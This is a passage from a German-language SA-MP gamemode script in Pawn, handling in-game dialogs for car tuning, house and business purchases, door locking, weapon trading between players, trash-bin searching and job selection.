				PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
				PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000, 0.000000);
				PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
				Tuning_farbe[playerid] = 1;
				Freeze(playerid);
				AutoTuningxx(playerid);
				GebeGeld(playerid,-250);
	        }
	        else if(listitem == 2)
	        {
	            ShowPlayerDialog(playerid, TUNING_NITRO, DIALOG_STYLE_LIST, "Wähle die Nitromenge aus:","Nitro 2x -100$\nNitro 5x -220$\nNitro 10x -440$","Einbauen","Abbrechen");
	        }
	        else if(listitem == 3)
	        {
	            if(SpielerInfo[playerid][uGeld] < 140)
				{
					SendClientMessage(playerid,COLOR_RED,"Du benötigst 140$!");

				}
				else
				{
				    new component = GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_HYDRAULICS);
                	if(component != 1087) AddVehicleComponent(GetPlayerVehicleID(playerid),1087);
                	GebeGeld(playerid,-140);
                	AutoTuningxx(playerid);
                }
                ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
	        }
	        else if(listitem == 4)
	        {
	            if(SpielerInfo[playerid][uGeld] < 120)
	            {
	                ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
	            }
	            else
	            {
	            	ShowPlayerDialog(playerid,DIALOG_REIFEN,DIALOG_STYLE_LIST,"Welchen Reifensatz möchtest du gerne?","Offroad\nShadow\nMega\nRimshine\nWires\nClassic\nTwist\nCutter\nSwitch\nGrove\nImport\nDollar\nTrance\nAtomic\nAhab\nVirtual\nAccess","Importieren","Zurück");
				}
			}
	        else if(listitem == 5)
	        {
	            if(SpielerInfo[playerid][uGeld] < TUNINGKOSTEN)
	            {
             		ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
	            }
	            else
	            {
	            	CallLocalFunction("cmd_tuning","d",playerid);
				}
	        }
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_RED,"Bitte fahre aus der Garage damit andere auch rein können!");
	    }
	}
	else if(dialogid == DIALOG_REIFEN)
	{
	    if(response)
	    {
	        new vehicle = GetPlayerVehicleID(playerid);
			if(vehicle == SAuto[playerid][0][sID])
			{
			    welcherslot[playerid] = 0;
			    mussspeichern[playerid] = 1;
			}
			else if(vehicle == SAuto[playerid][1][sID])
			{
			    welcherslot[playerid] = 1;
			    mussspeichern[playerid] = 1;
			}
			else
			{
		 		welcherslot[playerid] = -1;
			    mussspeichern[playerid] = 0;
			}
	        if(listitem == 0){AddVehicleComponent(GetPlayerVehicleID(playerid),1025);}
	        if(listitem == 1){AddVehicleComponent(GetPlayerVehicleID(playerid),1073);}
	        if(listitem == 2){AddVehicleComponent(GetPlayerVehicleID(playerid),1074);}
	        if(listitem == 3){AddVehicleComponent(GetPlayerVehicleID(playerid),1075);}
	        if(listitem == 4){AddVehicleComponent(GetPlayerVehicleID(playerid),1076);}
	        if(listitem == 5){AddVehicleComponent(GetPlayerVehicleID(playerid),1077);}
	        if(listitem == 6){AddVehicleComponent(GetPlayerVehicleID(playerid),1078);}
	        if(listitem == 7){AddVehicleComponent(GetPlayerVehicleID(playerid),1079);}
	        if(listitem == 8){AddVehicleComponent(GetPlayerVehicleID(playerid),1080);}
	        if(listitem == 9){AddVehicleComponent(GetPlayerVehicleID(playerid),1081);}
	        if(listitem == 10){AddVehicleComponent(GetPlayerVehicleID(playerid),1082);}
	        if(listitem == 11){AddVehicleComponent(GetPlayerVehicleID(playerid),1083);}
	        if(listitem == 12){AddVehicleComponent(GetPlayerVehicleID(playerid),1084);}
	        if(listitem == 13){AddVehicleComponent(GetPlayerVehicleID(playerid),1085);}
	        if(listitem == 14){AddVehicleComponent(GetPlayerVehicleID(playerid),1096);}
	        if(listitem == 15){AddVehicleComponent(GetPlayerVehicleID(playerid),1097);}
	        if(listitem == 16){AddVehicleComponent(GetPlayerVehicleID(playerid),1098);}
	        if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
	        GebeGeld(playerid,-120);
	        ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
		}
		else
		{
		    ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
		}
	}
	else if(dialogid == TUNING_NITRO)
	{
		if(response == 1)
	    {
	        new component = GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_NITRO);
			switch(listitem)
			{
			    case 0:
			    {
			        if(SpielerInfo[playerid][uGeld] < 100) { SendClientMessage(playerid,COLOR_RED,"Du benötigst 100$!"); ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen"); return 1; }
			        if(component != 1009) AddVehicleComponent(GetPlayerVehicleID(playerid),1009);
			        ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
                    GebeGeld(playerid,-100);
                    AutoTuningxx(playerid);
				}
			    case 1:
			    {
			        if(SpielerInfo[playerid][uGeld] < 220) { SendClientMessage(playerid,COLOR_RED,"Du benötigst 220$!"); ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen"); return 1; }
			        if(component != 1008) AddVehicleComponent(GetPlayerVehicleID(playerid),1008);
			        ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
                    GebeGeld(playerid,-220);
                    AutoTuningxx(playerid);
				}
			    case 2:
			    {
			        if(SpielerInfo[playerid][uGeld] < 440) { SendClientMessage(playerid,COLOR_RED,"Du benötigst 440$!"); ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen"); return 1; }
			        if(component != 1010) AddVehicleComponent(GetPlayerVehicleID(playerid),1010);
			        ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
                    GebeGeld(playerid,-440);
                    AutoTuningxx(playerid);
				}
			}
	    }
	}
	else if(dialogid == DIALOG_AKTIONEN)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SelectObject(playerid);
	            SendClientMessage(playerid,COLOR_GREEN,"Du kannst die Zeigerfunktion mit ESC beenden!");
	        }
	        else
	        {
	            SelectTextDraw(playerid,0xFFFFFFFF);
	            SendClientMessage(playerid,COLOR_GREEN,"Du kannst die Zeigerfunktion mit ESC beenden!");
	        }
	    }
	}
	else if(dialogid == DIALOG_TUEREN)
	{
		if(response)
		{
		    new Float:x,Float:y,Float:z,Float:RX,Float:RY,Float:RZ;
		    if(TuerSelected[playerid][1] == 1)
		    {
			    switch(listitem)
			    {
			        case 0:
			        {
			            GetDynamicObjectPos(HausInfo[TuerSelected[playerid][0]][hTuer],x,y,z);
			            if(HausInfo[TuerSelected[playerid][0]][hTuerOpen] == 0)
						{
						    if(HausInfo[TuerSelected[playerid][0]][hTuerLocked] == 1)
			       			{
			       			    SendClientMessage(playerid,COLOR_GREEN,"Haustür aufgeschlossen!");
					        	HausInfo[TuerSelected[playerid][0]][hTuerLocked] = 0;
			       			}
			       			else
			       			{
			       			    GetDynamicObjectRot(HausInfo[TuerSelected[playerid][0]][hTuer],RX,RY,RZ);
							    MoveObjektRot(HausInfo[TuerSelected[playerid][0]][hTuer],RX,RY,RZ+90,9);
							    HausInfo[TuerSelected[playerid][0]][hTuerOpen] = 1;
			       			}
		     			}
		     			else
		     			{
		     			    GetDynamicObjectRot(HausInfo[TuerSelected[playerid][0]][hTuer],RX,RY,RZ);
			 				MoveObjektRot(HausInfo[TuerSelected[playerid][0]][hTuer],RX,RY,RZ-90,9);
			   				HausInfo[TuerSelected[playerid][0]][hTuerOpen] = 0;
		     			}
			        }
			        case 1:
			        {
			            SendClientMessage(playerid,COLOR_RED,"Haustür abgeschlossen!");
		        		HausInfo[TuerSelected[playerid][0]][hTuerLocked] = 1;
			        }
			    }
		    }
		    else if(TuerSelected[playerid][1] == 2)
		    {
			    switch(listitem)
			    {
			        case 0:
			        {
			        
			            GetDynamicObjectPos(HausInfo[TuerSelected[playerid][0]][hTuer2],x,y,z);
			            if(HausInfo[TuerSelected[playerid][0]][hTuer2Open] == 0)
						{
						    if(HausInfo[TuerSelected[playerid][0]][hTuer2Locked] == 1)
			       			{
			       			    SendClientMessage(playerid,COLOR_GREEN,"Haustür aufgeschlossen!");
					        	HausInfo[TuerSelected[playerid][0]][hTuer2Locked] = 0;
			       			}
			       			else
			       			{
			       			    GetDynamicObjectRot(HausInfo[TuerSelected[playerid][0]][hTuer2],RX,RY,RZ);
							    MoveObjektRot(HausInfo[TuerSelected[playerid][0]][hTuer2],RX,RY,RZ+90,9);
							    HausInfo[TuerSelected[playerid][0]][hTuer2Open] = 1;
			       			}
		     			}
		     			else
		     			{
		     			    GetDynamicObjectRot(HausInfo[TuerSelected[playerid][0]][hTuer2],RX,RY,RZ);
			 				MoveObjektRot(HausInfo[TuerSelected[playerid][0]][hTuer2],RX,RY,RZ-90,9);
			   				HausInfo[TuerSelected[playerid][0]][hTuer2Open] = 0;
		     			}
			        }
			        case 1:
			        {
			            SendClientMessage(playerid,COLOR_RED,"Haustür abgeschlossen!");
		        		HausInfo[TuerSelected[playerid][0]][hTuer2Locked] = 1;
			        }
			    }
		    }
		}
	}
	else if(dialogid == DIALOG_TUERENAUF)
	{
		if(response)
		{
		    new Float:x,Float:y,Float:z,Float:RX,Float:RY,Float:RZ;
		    if(TuerSelected[playerid][1] == 1)
		    {
			    switch(listitem)
			    {
			        case 0:
			        {
			            GetDynamicObjectPos(HausInfo[TuerSelected[playerid][0]][hTuer],x,y,z);
			            if(HausInfo[TuerSelected[playerid][0]][hTuerOpen] == 0)
						{
						    if(HausInfo[TuerSelected[playerid][0]][hTuerLocked] == 1)
			       			{
			       			    SendClientMessage(playerid,COLOR_RED,"Haustür aufgebrochen! Du kannst sie nun öffnen!");
					        	HausInfo[TuerSelected[playerid][0]][hTuerLocked] = 0;
			       			}
			       			else
			       			{
			       			    GetDynamicObjectRot(HausInfo[TuerSelected[playerid][0]][hTuer],RX,RY,RZ);
							    MoveObjektRot(HausInfo[TuerSelected[playerid][0]][hTuer],RX,RY,RZ+90,9);
							    HausInfo[TuerSelected[playerid][0]][hTuerOpen] = 1;
			       			}
		     			}
		     			else
		     			{
		     			    GetDynamicObjectRot(HausInfo[TuerSelected[playerid][0]][hTuer],RX,RY,RZ);
			 				MoveObjektRot(HausInfo[TuerSelected[playerid][0]][hTuer],RX,RY,RZ-90,9);
			   				HausInfo[TuerSelected[playerid][0]][hTuerOpen] = 0;
		     			}
			        }
			    }
		    }
		    else if(TuerSelected[playerid][1] == 2)
		    {
			    switch(listitem)
			    {
			        case 0:
			        {
			            GetDynamicObjectPos(HausInfo[TuerSelected[playerid][0]][hTuer2],x,y,z);
			            if(HausInfo[TuerSelected[playerid][0]][hTuer2Open] == 0)
						{
						    if(HausInfo[TuerSelected[playerid][0]][hTuer2Locked] == 1)
			       			{
			       			    SendClientMessage(playerid,COLOR_RED,"Haustür aufgebrochen! Du kannst sie nun öffnen!");
					        	HausInfo[TuerSelected[playerid][0]][hTuer2Locked] = 0;
			       			}
			       			else
			       			{
			       			    GetDynamicObjectRot(HausInfo[TuerSelected[playerid][0]][hTuer2],RX,RY,RZ);
							    MoveObjektRot(HausInfo[TuerSelected[playerid][0]][hTuer2],RX,RY,RZ+90,9);
							    HausInfo[TuerSelected[playerid][0]][hTuer2Open] = 1;
			       			}
		     			}
		     			else
		     			{
		     			    GetDynamicObjectRot(HausInfo[TuerSelected[playerid][0]][hTuer2],RX,RY,RZ);
			 				MoveObjektRot(HausInfo[TuerSelected[playerid][0]][hTuer2],RX,RY,RZ-90,9);
			   				HausInfo[TuerSelected[playerid][0]][hTuer2Open] = 0;
		     			}
			        }
			    }
		    }
		}
	}
	else if(dialogid == DIALOG_BIZKAUF)
	{
	    if(response)
	    {
	        new id = bizidmerk[playerid];
	        if(SpielerInfo[playerid][uPerso] != 1) return SendClientMessage(playerid,COLOR_RED,"Du benötigst einen Personalausweis um ein Haus zu kaufen!");
    		if(SpielerInfo[playerid][uGeschaeftschluessel] != -1) return SendClientMessage(playerid,COLOR_RED,"Du besitzt bereits ein Geschäft!");
		    if(BizInfo[id][bbesitzer] != -1) return SendClientMessage(playerid,COLOR_RED,"Dieses Geschäft ist nicht zu verkaufen!");
			if(BizInfo[id][bpreis] > SpielerInfo[playerid][uGeld])
            {
                if(BizInfo[id][bpreis] > SpielerInfo[playerid][uKonto]) return SendClientMessage(playerid,COLOR_RED,"Du besitzt nicht genug Geld um dieses Haus zu kaufen!");
                KontoGeld(playerid,-BizInfo[id][bpreis],"Geschäft erworben!");
                SendClientMessage(playerid,COLOR_GREEN,"Gratulation zu deinem Kauf!");
                SendClientMessage(playerid,COLOR_GREEN,"Das Geld wurde von deinem Konto abgebucht!");
            }
            else GebeGeld(playerid,-BizInfo[id][bpreis]); SendClientMessage(playerid,COLOR_GREEN,"Gratulation zu deinem Kauf!");
            DestroyDynamicObject(BizInfo[id][bSchild]);
            SpielerInfo[playerid][uGeschaeftschluessel] = id;
            BizInfo[id][bbesitzer] = SpielerInfo[playerid][uID];
			new pppname[MAX_PLAYER_NAME];
			GetPlayerName(playerid,pppname,sizeof(pppname));
			format(BizInfo[id][bname],MAX_PLAYER_NAME,"%s",pppname);
			format(string,sizeof string,"Geschäftsnummer: %d\nBesitzer: %s",BizInfo[id][bnummer],BizInfo[id][bname]);
   			SetDynamicObjectMaterialText(BizInfo[id][bNummers],0,string,OBJECT_MATERIAL_SIZE_256x128,"Arial",23,1,0xFFFFFFFF,0x3C3C3CFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    		if(id == 10)
			{
				format(string,sizeof(string),"Besitzer: %s",BizInfo[id][bname]);
				SetDynamicObjectMaterialText(Tankstelle3, 4,string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
			}
			if(id == 11)
			{
				format(string,sizeof(string),"Besitzer: %s",BizInfo[id][bname]);
				SetDynamicObjectMaterialText(Tankstelle1, 4,string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
			}
			if(id == 12)
			{
				format(string,sizeof(string),"Besitzer: %s",BizInfo[id][bname]);
				SetDynamicObjectMaterialText(Tankstelle2, 4,string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF635C5A, 1);
			}
			Geschaftspeichern(id);
	    }
	}
	else if(dialogid == DIALOG_HAUSKAUF)
	{
	    if(response)
	    {
	        new id = HouseChosen[playerid];
	        if(SpielerInfo[playerid][uPerso] != 1) return SendClientMessage(playerid,COLOR_RED,"Du benötigst einen Personalausweis um ein Haus zu kaufen!");
    		if(SpielerInfo[playerid][uHausschluessel] != -1) return SendClientMessage(playerid,COLOR_RED,"Du besitzt bereits ein Haus!");
		    if(HausInfo[id][hBesitzer] != -1) return SendClientMessage(playerid,COLOR_RED,"Dieses Haus ist nicht zu verkaufen!");
			if(HausInfo[id][hPreis] > SpielerInfo[playerid][uGeld])
            {
                if(HausInfo[id][hPreis] > SpielerInfo[playerid][uKonto]) return SendClientMessage(playerid,COLOR_RED,"Du besitzt nicht genug Geld um dieses Haus zu kaufen!");
                KontoGeld(playerid,-HausInfo[id][hPreis],"Haus erworben.");
                SendClientMessage(playerid,COLOR_GREEN,"Gratulation zu deinem Kauf!");
                SendClientMessage(playerid,COLOR_GREEN,"Das Geld wurde von deinem Konto abgebucht!");
            }
            else GebeGeld(playerid,-HausInfo[id][hPreis]); SendClientMessage(playerid,COLOR_GREEN,"Gratulation zu deinem Kauf! Wähle nun deinen Spawn aus!");
            Delete3DTextLabel(HausInfo[id][Schildlabel]);
           	new string5[500];
			new atext[70] = "{FEFEFE}Spawnen auf ausgeloggter Position\n";
			new lstext[70] = "{FEFEFE}Spawnen im LS Motel oder SF Motel\n";
			new ftext[70] = "{FEFEFE}Spawnen in der Fraktionsbase\n";
			new hspawn[70] = "{FEFEFE}Spawnen im gekauften Haus";
			if(SpielerInfo[playerid][uSpawn] == 1 || SpielerInfo[playerid][uSpawn] == 2)
			{
			    lstext = "{00FF1E}Spawnen im LS Motel oder SF Motel\n";
			}
			else if(SpielerInfo[playerid][uSpawn] == 4)
			{
			    ftext = "{00FF1E}Spawnen in der Fraktionsbase\n";
			}
			else if(SpielerInfo[playerid][uSpawn] == 0)
			{
			    atext = "{00FF1E}Spawnen auf ausgeloggter Position\n";
			}
			else if(SpielerInfo[playerid][uSpawn] == 3)
			{
			    hspawn = "{00FF1E}Spawnen im gekauften Haus";
			}
			format(string5,sizeof(string5),"%s%s%s%s",atext,lstext,ftext,hspawn);
			ShowPlayerDialog(playerid,DIALOG_SPAWNEN,DIALOG_STYLE_LIST,"Spawn Auswahl",string5,"Wählen","Abbrechen");
            DestroyDynamicObject(HausInfo[id][hSchild]);
            SpielerInfo[playerid][uHausschluessel] = id;
            HausInfo[id][hBesitzer] = SpielerInfo[playerid][uID];
			new pppname[MAX_PLAYER_NAME];
			GetPlayerName(playerid,pppname,sizeof(pppname));
			format(HausInfo[id][hName],MAX_PLAYER_NAME,"%s",pppname);
			format(string,sizeof string,"Hausnummer: %d\nBesitzer: %s",HausInfo[id][sphnummer],HausInfo[id][hName]);
   			SetDynamicObjectMaterialText(HausInfo[id][hNummer],0,string,OBJECT_MATERIAL_SIZE_256x128,"Arial",23,1,0xFFFFFFFF,0x3C3C3CFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
			HausSpeichern(id);
	    }
	}
	else if(dialogid == DIALOG_HAUS_OBJEKT)
	{
	    if(response) //Edit
	    {
	        EditDynamicObject(playerid,Moebel[SpielerInfo[playerid][uHausschluessel]][PlayerClickedObject[playerid]]);
	    }
	    else //Löschen
	    {
	        DestroyDynamicObject(Moebel[SpielerInfo[playerid][uHausschluessel]][PlayerClickedObject[playerid]]);
	        Moebelanzahl[SpielerInfo[playerid][uHausschluessel]]--;
	        for(new x = 0; x < MAX_INVENTAR; x++)
	        {
	            if(Inventar[playerid][x] < 100)
	            {
		        	Inventar[playerid][x] = PlayerClickedObjectModel[playerid];
		        	break;
	        	}
	        }
	        CancelEdit(playerid);
   	    }
	}
	else if(dialogid == DIALOG_MOEBELKAUF)
	{
	    if(response)
	    {
	        if(SpielerInfo[playerid][uGeld] < MoebelPreise[HouseChosen[playerid]][MHPreis]) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
            for(new x = 0; x < MAX_INVENTAR; x++)
	        {
	            if(Inventar[playerid][x] < 100)
	            {
		        	Inventar[playerid][x] = MoebelPreise[HouseChosen[playerid]][MHModell];
		        	SendClientMessage(playerid,COLOR_GREEN,"Möbelstück erworben!");
		        	GebeGeld(playerid,-MoebelPreise[HouseChosen[playerid]][MHPreis]);
		        	HouseChosen[playerid] = -1;
		        	break;
	        	}
	        }
	    }
	}
	else if(dialogid == DIALOG_INVENTAR)
	{
	    if(response)
	    {
			if(SpielerInventar[playerid][InventarClicked[playerid]][0] > -1)
 			{
 			    if(listitem == 0)
 			    {
					GebeWaffe(playerid,InventarValues[SpielerInventar[playerid][InventarClicked[playerid]][0]][iModell],SpielerInventar[playerid][InventarClicked[playerid]][1]);
                    SpielerInventar[playerid][InventarClicked[playerid]][0] = -1;
                    SpielerInventar[playerid][InventarClicked[playerid]][1] = 0;
                    PlayerTextDrawHide(playerid,SpielerInventarText[playerid][InventarClicked[playerid]+7]);
					PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][InventarClicked[playerid]+22],"0");
					InventarClicked[playerid] = -1;
				}
				if(listitem == 1)
 			    {
 			        if(SpielerInfo[playerid][uLevel] >= 2)
 			        {
						ShowPlayerDialog(playerid, DIALOG_INVENTAR2, DIALOG_STYLE_INPUT,"Waffen-Verkauf","Wem willst du die Waffe verkaufen?","Weiter","Abbrechen");
					}else SendClientMessage(playerid,COLOR_RED,"Du kannst diese Funktion erst ab Level 2 benutzen!");
				}
				if(listitem == 2)
 			    {
                    SpielerInventar[playerid][InventarClicked[playerid]][0] = -1;
                    SpielerInventar[playerid][InventarClicked[playerid]][1] = 0;
					PlayerTextDrawHide(playerid,SpielerInventarText[playerid][InventarClicked[playerid]+7]);
					PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][InventarClicked[playerid]+22],"0");
					InventarClicked[playerid] = -1;
				}
		    }
    	}
	}
	else if(dialogid == DIALOG_INVENTAR2)
	{
	    if(response)
	    {
	        if(sscanf(inputtext,"u",InventarClickedUser[playerid])) return SendClientMessage(playerid,COLOR_RED,"Kein aktiver Spieler!");
	        if(EntfernungZwischenSpielern(playerid,InventarClickedUser[playerid]) > 3) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zuweit entfernt!");
			if(SpielerInfo[InventarClickedUser[playerid]][uLevel] >= 2)
			{
				ShowPlayerDialog(playerid, DIALOG_INVENTAR3, DIALOG_STYLE_INPUT,"Waffen-Verkauf","Für wie viel Doller willst du die Waffe verkaufen?","Weiter","Abbrechen");
			}else SendClientMessage(playerid,COLOR_RED,"Der andere Spieler muss Level 2 sein!");
		}
	}
	else if(dialogid == DIALOG_INVENTAR3)
	{
	    if(response)
	    {
	        new waffename[20];
	        if(sscanf(inputtext,"f",InventarClickedPreis[playerid]) || InventarClickedPreis[playerid] < 0.01) return SendClientMessage(playerid,COLOR_RED,"Der Betrag muss mindestens 1Cent betragen!");
	        GetWeaponName(InventarValues[SpielerInventar[playerid][InventarClicked[playerid]][0]][iModell],waffename,sizeof waffename);
	        format(string,sizeof string,"%s bietet dir eine Waffe an\n%s mit %d Munition\nPreis %.2f$",PlayerName(playerid),waffename,SpielerInventar[playerid][InventarClicked[playerid]][1],InventarClickedPreis[playerid]);
	        ShowPlayerDialog(InventarClickedUser[playerid],DIALOG_INVENTARKAUF,DIALOG_STYLE_MSGBOX,"Waffen-Kauf",string,"Kaufen","Abbrechen");
	        Waffenangebot[InventarClickedUser[playerid]][0] = playerid;
	        Waffenangebot[InventarClickedUser[playerid]][1] = InventarClicked[playerid];
	        SendClientMessage(playerid,COLOR_GREEN,"Waffenabgebot gesendet!");
	    }
	}
	else if(dialogid == DIALOG_INVENTARKAUF)
	{
	    if(response)
	    {
			if(SpielerInfo[playerid][uGeld] < InventarClickedPreis[Waffenangebot[playerid][0]]) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
            GebeWaffe(playerid,InventarValues[SpielerInventar[Waffenangebot[playerid][0]][Waffenangebot[playerid][1]][0]][iModell],SpielerInventar[Waffenangebot[playerid][0]][Waffenangebot[playerid][1]][1]);
			GebeGeld(playerid,-InventarClickedPreis[Waffenangebot[playerid][0]]);
			GebeGeld(Waffenangebot[playerid][0],InventarClickedPreis[Waffenangebot[playerid][0]]);
			SpielerInventar[Waffenangebot[playerid][0]][Waffenangebot[playerid][1]][0] = -1;
      		SpielerInventar[Waffenangebot[playerid][0]][Waffenangebot[playerid][1]][1] = 0;
			PlayerTextDrawHide(Waffenangebot[playerid][0],SpielerInventarText[Waffenangebot[playerid][0]][Waffenangebot[playerid][1]+7]);
			PlayerTextDrawSetString(Waffenangebot[playerid][0],SpielerInventarText[Waffenangebot[playerid][0]][Waffenangebot[playerid][1]+22],"0");
			InventarClicked[Waffenangebot[playerid][0]] = -1;
			SendClientMessage(Waffenangebot[playerid][0],COLOR_GREEN,"Waffe verkauft!");
			Waffenangebot[playerid][0] = -1;
			Waffenangebot[playerid][1] = -1;
	    }
 	}
 	else if(dialogid == DIALOG_MUELTONNE)
 	{
 	    if(response == 1)
 	    {
      		if(MueltonneGeleert[MueltonneChoosen[playerid]] > 0) return SendClientMessage(playerid,COLOR_RED,"Diese Mülltonne wurde bereits geleert!");
       		MueltonneGeleert[MueltonneChoosen[playerid]] = 300;
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_CARRY);
         	SetPlayerAttachedObject(playerid, 9, 1264, 5, 0.302, 0.378, 0.071, -65.299, 0.000, 0.899);
 	   	}
 	   	else
 	   	{
	    	new zahl = random(20);
		    if(zahl == 10 || zahl == 5)
		    {
      			SendClientMessage(playerid,COLOR_GREEN,"Du hast eine Pfandflasche gefunden!");
      			if(!Verstauen(playerid,1486,1)) return SendClientMessage(playerid,COLOR_RED,"Inventar voll!");
			}
			else if(zahl == 17)
			{
   				new Float:geld = 10+random(40);
				format(string,sizeof string,"Du hast %.0f Cent gefunden!",geld);
				SendClientMessage(playerid,COLOR_GREEN,string);
				GebeGeld(playerid,geld/100);
			}
			else
			{
   				SendClientMessage(playerid,COLOR_RED,"Du hast nichts gefunden!");
			}
		}
 	}
 	else if(dialogid == DIALOG_JOBCENTER)
 	{
 	    if(response)
 	    {
 	        SpielerInfo[playerid][uJob] = listitem+1;
 	        format(string,sizeof string,"Herzlichen Glückwunsch, du arbeitest nun als %s, nutze den Befehl /navi um deinen Arbeitsplatz zu besuchen.",JobNamen[listitem]);
 	        SendClientMessage(playerid,COLOR_GREEN,string);
            if(SpielerInfo[playerid][ufBeruf] == 0)
	        {
	        	SpielerInfo[playerid][ufBeruf] = 1;
	        	Missionenaktu(playerid);
	        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Beruf/Job {0080FF}(/missionen)");
	        	new Float:belohnung;
            	belohnung = 150;
            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
				GebeGeld(playerid,belohnung);
			}
		 }else ShowPlayerDialog(playerid,DIALOG_STADTHALLE,DIALOG_STYLE_LIST,"Stadthalle - Was möchtest du unternehmen?","Personalausweis beantragen\nFraktionslosengeld beantragen\nKennzeichen beantragen\nArbeitsamt - Job auswählen\nWerbung schreiben -100$","Weiter","Abbrechen");
 	}
 	else if(dialogid == DIALOG_AUTOKAUF)
 	{
		if(response == 1)
 	    {
 	        if(SpielerInfo[playerid][uLeiter] > 0)
 	        {
 	            FrakAutochoose[playerid] = 0;
 	            for(new x = 0; x < 5; x++) PlayerTextDrawShow(playerid, Autohaus[playerid][x]);
				format(string,sizeof string,"Autoname: %s",AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][0]-399][AutoName]);
				PlayerTextDrawSetString(playerid,Autohaus[playerid][1],string);
				format(string,sizeof string,"Preis: %d $",AutoListePreise[SpielerInfo[playerid][uLeiter]-1][0]);
				PlayerTextDrawSetString(playerid,Autohaus[playerid][2],string);
				if(AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][0]-399][aKraftstoff] == 0) PlayerTextDrawSetString(playerid,Autohaus[playerid][3],"Kraftstoff: Diesel");
				else PlayerTextDrawSetString(playerid,Autohaus[playerid][3],"Kraftstoff: Benzin");
				format(string,sizeof string,"Tank: %dL",AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][0]-399][MaxBenzin]);
				PlayerTextDrawSetString(playerid,Autohaus[playerid][4],string);
				PlayerTextDrawSetPreviewModel(playerid,Autohaus[playerid][7], AutoListe[SpielerInfo[playerid][uLeiter]-1][0]);
				PlayerTextDrawShow(playerid, Autohaus[playerid][7]);
				Freeze(playerid);
			}
 	    }
 	}
 	if(dialogid == DIALOG_FRAKMENU)
	{
		if(response)
		{
			if(listitem == 0)
			{
       			format(string,sizeof string,"SELECT login.Name,user.Rang FROM `user` JOIN `login` ON user.userid=login.ID WHERE user.Mitglied='%d' OR user.Leiter='%d'",SpielerInfo[playerid][uLeiter],SpielerInfo[playerid][uLeiter]);
			    mysql_query(dbhandle, string, true);
			    printf("%s",string);
			    new data[MAX_PLAYER_NAME],data2,stringges[1000];
				for(new i=0; i<cache_num_rows(); i++)
				{
					data2 = cache_get_field_content_int(i, "Rang");
		   			cache_get_field_content(i, "Name",data);
